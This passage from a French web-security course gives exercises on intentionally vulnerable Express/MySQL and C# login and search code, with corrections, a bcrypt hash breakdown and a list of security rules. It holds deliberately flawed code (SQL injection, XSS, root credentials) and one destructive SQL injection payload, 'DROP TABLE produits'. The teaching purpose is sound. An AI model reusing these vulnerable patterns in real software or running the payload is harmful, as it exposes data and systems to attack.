+Donnees acceptables pour un site e-commerce : nom, prenom, email (communication), adresse (livraison), telephone (suivi de livraison). Le reste est soit superflu, soit a collecter au moment opportun.
+
+---
+
+### Exercice 10 : Identifier toutes les failles
+
+**Enonce** : Ce code contient plusieurs failles de securite. Les identifier toutes et proposer des corrections.
+
+```javascript
+const express = require('express');
+const mysql = require('mysql2');
+const app = express();
+
+app.use(express.urlencoded({ extended: true }));
+
+const db = mysql.createConnection({
+  host: 'localhost',
+  user: 'root',         // Probleme 1
+  password: 'root',     // Probleme 2
+  database: 'boutique'
+});
+
+app.post('/login', (req, res) => {
+  const { login, password } = req.body;
+
+  // Probleme 3
+  const sql = `SELECT * FROM users WHERE login = '${login}' AND password = '${password}'`;
+
+  db.query(sql, (err, results) => {
+    if (err) {
+      res.send('Erreur : ' + err.message); // Probleme 4
+      return;
+    }
+    if (results.length > 0) {
+      res.send('Bienvenue ' + results[0].login); // Probleme 5
+    }
+  });
+});
+
+app.listen(3000); // Probleme 6
+```
+
+**Correction** :
+
+1. **Utilisateur root pour la BDD** : violation du principe du moindre privilege. Creer un utilisateur dedie avec uniquement les droits necessaires (SELECT, INSERT, UPDATE sur les tables de l'application).
+
+2. **Mot de passe trivial** : le mot de passe de la base de donnees est "root". Utiliser un mot de passe fort et le stocker dans une variable d'environnement, pas dans le code.
+
+3. **Injection SQL** : les variables `login` et `password` sont concatenees directement dans la requete. Utiliser des requetes preparees avec `connection.execute()`.
+
+4. **Message d'erreur detaille** : `err.message` peut contenir des informations sur la structure de la base, les noms de tables, etc. En production, afficher un message generique.
+
+5. **XSS potentiel** : `results[0].login` est insere dans le HTML sans echappement. Si le login contient du HTML/JavaScript, il sera execute.
+
+6. **Pas de HTTPS** : le serveur ecoute en HTTP. Les identifiants transitent en clair sur le reseau.
+
+7. **Mot de passe en clair en BDD** (implicite) : la requete compare `password = '${password}'`, ce qui signifie que le mot de passe est stocke en clair en base. Il devrait etre hache avec bcrypt.
+
+8. **Pas de gestion de session** : apres une connexion reussie, le serveur envoie juste "Bienvenue" sans creer de session. L'utilisateur devra se reconnecter a chaque requete.
+
+Code corrige :
+
+```javascript
+const express = require('express');
+const mysql = require('mysql2/promise');
+const session = require('express-session');
+const bcrypt = require('bcrypt');
+const helmet = require('helmet');
+const app = express();
+
+app.use(express.urlencoded({ extended: true }));
+app.use(helmet()); // En-tetes de securite
+
+app.use(session({
+  secret: process.env.SESSION_SECRET,
+  resave: false,
+  saveUninitialized: false,
+  cookie: { httpOnly: true, secure: true, sameSite: 'lax' }
+}));
+
+const db = mysql.createPool({
+  host: process.env.DB_HOST,
+  user: process.env.DB_USER,       // Utilisateur dedie, pas root
+  password: process.env.DB_PASS,   // Mot de passe fort depuis l'environnement
+  database: 'boutique'
+});
+
+function echapperHtml(texte) {
+  return String(texte)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}
+
+app.post('/login', async (req, res) => {
+  const { login, password } = req.body;
+
+  try {
+    // Requete preparee
+    const [rows] = await db.execute(
+      'SELECT id, login, password_hash FROM users WHERE login = ?',
+      [login]
+    );
+
+    if (rows.length === 0) {
+      return res.status(401).send('Identifiants incorrects');
+    }
+
+    // Verification du hash bcrypt
+    const correspond = await bcrypt.compare(password, rows[0].password_hash);
+
+    if (!correspond) {
+      return res.status(401).send('Identifiants incorrects');
+    }
+
+    // Creation de session
+    req.session.userId = rows[0].id;
+    res.send('Bienvenue ' + echapperHtml(rows[0].login));
+  } catch (err) {
+    console.error(err); // Log cote serveur pour le debug
+    res.status(500).send('Erreur interne'); // Message generique cote client
+  }
+});
+
+// HTTPS en production (via reverse proxy ou directement)
+app.listen(3000);
+```
+
+---
+
+### Exercice 11 : Question de cours sur bcrypt
+
+**Enonce** : Expliquer ce que contient la chaine suivante et a quoi sert chaque partie.
+
+```
+$2b$12$LJ3m4ys3Lk0TDbXr.2HUNeBr0bFO0jXVGHZdFqKm5GXLOZ3FZCOi
+```
+
+**Correction** :
+
+C'est un hash bcrypt. Il contient trois informations :
+
+- `$2b$` : la version de l'algorithme bcrypt. `2b` est la version corrigee et actuelle.
+- `$12$` : le facteur de cout (cost factor). Le nombre d'iterations est 2^12 = 4096. Plus le chiffre est eleve, plus le calcul est lent (et donc plus il est resistant au brute force).
+- `LJ3m4ys3Lk0TDbXr.2HUNe` (22 premiers caracteres apres le cout) : le sel, encode en Base64 modifie.
+- `Br0bFO0jXVGHZdFqKm5GXLOZ3FZCOi` (31 caracteres restants) : le hash du mot de passe + sel.
+
+Le sel est integre dans la chaine, ce qui signifie qu'on n'a pas besoin de le stocker separement. La fonction `bcrypt.compare()` extrait le sel du hash stocke, recalcule le hash du mot de passe fourni avec ce sel, et compare les resultats.
+
+---
+
+### Exercice 12 : Corriger du code C# vulnerable
+
+**Enonce** : Identifier et corriger les failles.
+
+```csharp
+public IActionResult Recherche(string terme)
+{
+    string sql = "SELECT * FROM produits WHERE nom LIKE '%" + terme + "%'";
+
+    using (var command = new MySqlCommand(sql, connection))
+    {
+        using (var reader = command.ExecuteReader())
+        {
+            var resultats = new List<string>();
+            while (reader.Read())
+            {
+                resultats.Add(reader.GetString("nom"));
+            }
+            ViewBag.Resultats = resultats;
+            ViewBag.Terme = terme;
+        }
+    }
+
+    return View();
+    // Dans la vue : <p>Recherche : @Html.Raw(ViewBag.Terme)</p>
+}
+```
+
+**Correction** :
+
+Deux failles :
+
+1. **Injection SQL** : la variable `terme` est concatenee dans la requete. Attaque possible : `%'; DROP TABLE produits; --`.
+
+2. **XSS** : dans la vue, `Html.Raw(ViewBag.Terme)` affiche le terme sans echappement. L'attaquant peut injecter du JavaScript.
+
+Code corrige :
+
+```csharp
+public IActionResult Recherche(string terme)
+{
+    // Requete parametree
+    string sql = "SELECT * FROM produits WHERE nom LIKE @terme";
+
+    using (var command = new MySqlCommand(sql, connection))
+    {
+        // Le % est inclus dans la valeur du parametre, pas dans la requete
+        command.Parameters.AddWithValue("@terme", "%" + terme + "%");
+
+        using (var reader = command.ExecuteReader())
+        {
+            var resultats = new List<string>();
+            while (reader.Read())
+            {
+                resultats.Add(reader.GetString("nom"));
+            }
+            ViewBag.Resultats = resultats;
+            ViewBag.Terme = terme;
+        }
+    }
+
+    return View();
+    // Dans la vue : <p>Recherche : @ViewBag.Terme</p>
+    // Sans Html.Raw, Razor echappe automatiquement
+}
+```
+
+---
+
+## Resume : les regles d'or de la securite applicative
+
+1. **Ne jamais faire confiance aux donnees utilisateur.** Valider, assainir, echapper.
+2. **Utiliser des requetes preparees.** Toujours. Sans exception.
+3. **Hacher les mots de passe avec bcrypt ou Argon2.** Jamais en clair, jamais en MD5, jamais avec un chiffrement reversible.
+4. **Echapper les donnees avant de les afficher en HTML.** Utiliser les mecanismes du framework (Razor echappe par defaut, EJS avec `<%= %>`).
+5. **Proteger les formulaires avec des tokens CSRF.**
+6. **Configurer les cookies correctement** : HttpOnly, Secure, SameSite.
+7. **Forcer HTTPS partout.**
+8. **Valider cote serveur.** La validation cote client est un confort, pas une securite.
+9. **Appliquer le principe du moindre privilege.** L'utilisateur BDD n'a que les droits necessaires.
+10. **Ne pas afficher les erreurs techniques aux utilisateurs.**
+11. **Mettre a jour les dependances regulierement.**
+12. **Respecter le RGPD** : minimisation, consentement, droits des personnes, privacy by design.
